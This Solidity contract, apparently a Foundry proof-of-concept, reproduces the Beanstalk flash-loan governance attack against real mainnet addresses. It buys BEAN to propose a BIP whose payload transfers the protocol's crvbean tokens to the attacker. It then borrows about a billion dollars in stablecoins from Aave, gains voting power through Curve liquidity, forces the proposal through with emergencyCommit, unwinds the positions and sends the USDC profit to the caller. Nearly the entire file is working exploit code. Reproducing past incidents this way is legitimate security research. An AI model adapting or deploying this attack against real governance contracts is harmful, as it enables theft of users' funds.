// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/token/ERC20/ERC20.sol";
import "@openzeppelin/token/ERC20/utils/SafeERC20.sol";
import "@uniswap-v2-periphery/interfaces/IUniswapV2Router02.sol";
import "forge-std/console.sol";
import "./interfaces.sol";

contract Attacker {
    using SafeERC20 for ERC20;

    uint32 bip = 18;
    address crvbean = 0x3a70DfA7d2262988064A2D051dd47521E43c9BdD;
    address beanStalk = 0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5;

    ERC20 dai = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    ERC20 usdc = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ERC20 usdt = ERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    ERC20 bean = ERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    ERC20 threeCrv = ERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
  
    IAaveLendingPool aavelendingPool = IAaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    IUniswapV2Router02 uniswapRouter = IUniswapV2Router02(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    ICurvePool threeCrvPool = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);

    // ========= BIP Creation Logic ========= //

    function proposeBip() external payable {
        swapEthForBean();
        console.log(
            "After ETH -> BEAN swap, Bean balance of attacker: %s",
            bean.balanceOf(address(this)) / 1e6
        );

        depositAllBean();
        console.log(
            "After BEAN deposit to beanStalk, Bean balance of attacker: %s",
            bean.balanceOf(address(this)) / 1e6
        );

        submitProposal();
    }

    function swapEthForBean() internal {
        address[] memory path = new address[](2);
        path[0] = uniswapRouter.WETH();
        path[1] = address(bean);
        uniswapRouter.swapExactETHForTokens{ value: 70 ether }(
            0,
            path,
            address(this),
            block.timestamp + 120
        );
    }

    function depositAllBean() internal {
        bean.safeApprove(beanStalk, type(uint256).max);
        IBeanStalk(beanStalk).depositBeans(bean.balanceOf(address(this)));
    }

    function submitProposal() internal {
        IBeanStalk.FacetCut[] memory _diamondCut = new IBeanStalk.FacetCut[](0);
        bytes memory data = abi.encodeWithSelector(Attacker.getProposalProfit.selector);
        IBeanStalk(beanStalk).propose(_diamondCut, address(this), data, 3);
    }

    // ========= Governance Attack Logic ========= //

    function attack() external {
        approveEverything();

        flashloanAave();

        console.log(
            "Final profit, usdc balance of attacker: %s",
            usdc.balanceOf(address(this)) / (10**usdc.decimals())
        );
        
        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
    }

    function approveEverything() internal {
        dai.safeApprove(address(aavelendingPool), type(uint256).max);
        usdc.safeApprove(address(aavelendingPool), type(uint256).max);
        usdt.safeApprove(address(aavelendingPool), type(uint256).max);

        dai.safeApprove(address(threeCrvPool), type(uint256).max);
        usdc.safeApprove(address(threeCrvPool), type(uint256).max);
        usdt.safeApprove(address(threeCrvPool), type(uint256).max);
        
        threeCrv.safeApprove(crvbean, type(uint256).max);

        ERC20(crvbean).safeApprove(beanStalk, type(uint256).max);
    }

    function flashloanAave() internal {
        address[] memory assets = new address[](3);
        assets[0] = address(dai);
        assets[1] = address(usdc);
        assets[2] = address(usdt);

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 350_000_000 * 10**dai.decimals();
        amounts[1] = 500_000_000 * 10**usdc.decimals();
        amounts[2] = 150_000_000 * 10**usdt.decimals();

        uint256[] memory modes = new uint256[](3);
        aavelendingPool.flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            new bytes(0),
            0
        );
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        getCurveBean(amounts);
        passBip();
        swapCurveBeanBack(amounts, premiums);
        return true;
    }

    function getCurveBean(uint256[] calldata amounts) internal {
        uint256[3] memory tempAmounts;
        tempAmounts[0] = amounts[0];
        tempAmounts[1] = amounts[1];
        tempAmounts[2] = amounts[2];
        threeCrvPool.add_liquidity(tempAmounts, 0);

        uint256[2] memory tempAmounts2;
        tempAmounts2[0] = 0;
        tempAmounts2[1] = threeCrv.balanceOf(address(this));
        ICurvePool(crvbean).add_liquidity(tempAmounts2, 0);

        console.log(
            "After adding 3crv liquidity , crvbean balance of attacker: %s",
            ERC20(crvbean).balanceOf(address(this))
        );
    }

    function passBip() internal {
        IBeanStalk(beanStalk).deposit(
            crvbean,
            ERC20(crvbean).balanceOf(address(this))
        );
        // beanStalk.vote(bip); --> this line not needed, as beanStalk.propose() already votes for our bip
        IBeanStalk(beanStalk).emergencyCommit(bip);
        console.log(
            "After calling beanStalk.emergencyCommit() , crvbean balance of attacker: %s",
            ERC20(crvbean).balanceOf(address(this))
        );
    }

    function swapCurveBeanBack(
        uint256[] calldata amounts,
        uint256[] calldata premiums
    ) internal {
        ICurvePool(crvbean).remove_liquidity_one_coin(
            ERC20(crvbean).balanceOf(address(this)),
            1,
            0
        );
        console.log(
            "After removing liquidity from crvbean pool , crvbean balance of attacker: %s",
            ERC20(crvbean).balanceOf(address(this))
        );
        uint256[3] memory tempAmounts;
        tempAmounts[0] = amounts[0] + premiums[0];
        tempAmounts[1] = amounts[1] + premiums[1];
        tempAmounts[2] = amounts[2] + premiums[2];
        console.log("premiums[0]: %s", premiums[0]);
        console.log("premiums[1]: %s", premiums[1]);
        console.log("premiums[2]: %s", premiums[2]);
        console.log("tempAmounts[0]: %s", tempAmounts[0]);
        console.log("tempAmounts[1]: %s", tempAmounts[1]);
        console.log("tempAmounts[2]: %s", tempAmounts[2]);

        threeCrvPool.remove_liquidity_imbalance(tempAmounts, type(uint256).max);
        threeCrvPool.remove_liquidity_one_coin(
            threeCrv.balanceOf(address(this)),
            1,
            0
        );

        console.log(
            "After removing 3crv liquidity from 3crv pool, usdc balance of attacker: %s",
            usdc.balanceOf(address(this))
        );
    }

    function getProposalProfit() external {
        address crvbeanToken = 0x3a70DfA7d2262988064A2D051dd47521E43c9BdD;
        ERC20(crvbeanToken).transfer(
            msg.sender,
            ERC20(crvbeanToken).balanceOf(address(this))
        );
    } 
}